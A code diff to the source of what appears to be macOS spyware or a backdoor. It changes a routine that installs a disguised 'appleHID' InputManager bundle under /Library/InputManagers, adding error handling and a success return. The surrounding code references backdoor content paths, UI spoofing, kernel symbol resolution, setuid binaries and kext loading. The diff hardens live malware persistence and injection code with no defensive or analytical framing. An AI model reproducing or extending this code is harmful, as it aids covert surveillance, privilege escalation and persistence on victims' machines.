@@ -232,7 +232,7 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (BOOL)_UISpoof;
 
-- (void)_dropInputManager;
+- (BOOL)_dropInputManager;
 
 - (void)_solveKernelSymbolsForKext;
 
@@ -1799,7 +1799,7 @@ static void computerWillShutdown(CFMachPortRef port,
   return NO;
 }
 
-- (void)_dropInputManager
+- (BOOL)_dropInputManager
 {
   NSString *err;
   NSString *_backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
@@ -1815,13 +1815,49 @@ static void computerWillShutdown(CFMachPortRef port,
   //
   // Input Manager
   //
-  mkdir("/Library/InputManagers", 0755);
-  mkdir("/Library/InputManagers/appleHID", 0755);
-  mkdir("/Library/InputManagers/appleHID/appleHID.bundle", 0755);
-  mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents", 0755);
-  mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/MacOS", 0755);
-  mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/Resources", 0755);
-  
+  if (mkdir("/Library/InputManagers", 0755) == -1)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir InputManagers (%d)", errno);
+#endif
+      return NO;
+    }
+  if (mkdir("/Library/InputManagers/appleHID", 0755) == -1)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir appleHID (%d)", errno);
+#endif
+      return NO;
+    }
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle", 0755) == -1)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir appleHID.bundle (%d)", errno);
+#endif
+      return NO;
+    }
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents", 0755) == -1)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir Contents (%d)", errno);
+#endif
+      return NO;
+    }
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/MacOS", 0755) == -1)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir MacOS (%d)", errno);
+#endif
+      return NO;
+    }
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/Resources", 0755) == -1)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir Resources (%d)", errno);
+#endif
+      return NO;
+    }
+
   NSMutableDictionary *rootObj2 = [NSMutableDictionary dictionaryWithCapacity: 4];
   NSMutableDictionary *innerDict2 = [NSMutableDictionary dictionaryWithCapacity: 1];
   [innerDict2 setObject: gInputManagerName
@@ -1898,6 +1934,7 @@ static void computerWillShutdown(CFMachPortRef port,
          waitUntilEnd: YES];
   
   [destDir release];
+  return YES;
 }
 
 - (void)_dropOsaxBundle
@@ -2362,7 +2399,6 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
       
       [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
-      
       exit(0);
     }
 
@@ -2553,7 +2589,12 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
               infoLog(@"Dropping input manager");
 #endif
-              [self _dropInputManager];
+              if ([self _dropInputManager] == NO)
+                {
+#ifdef DEBUG_CORE
+                  errorLog(@"Error while installing input manager");
+#endif
+                }
             }
         }
     }
@@ -2561,7 +2602,7 @@ static void computerWillShutdown(CFMachPortRef port,
   [NSThread detachNewThreadSelector: @selector(_registerForShutdownNotifications)
                            toTarget: self
                          withObject: nil];
-  
+
 #ifndef NO_KEXT
   int ret = 0;
   int kextLoaded = 0;
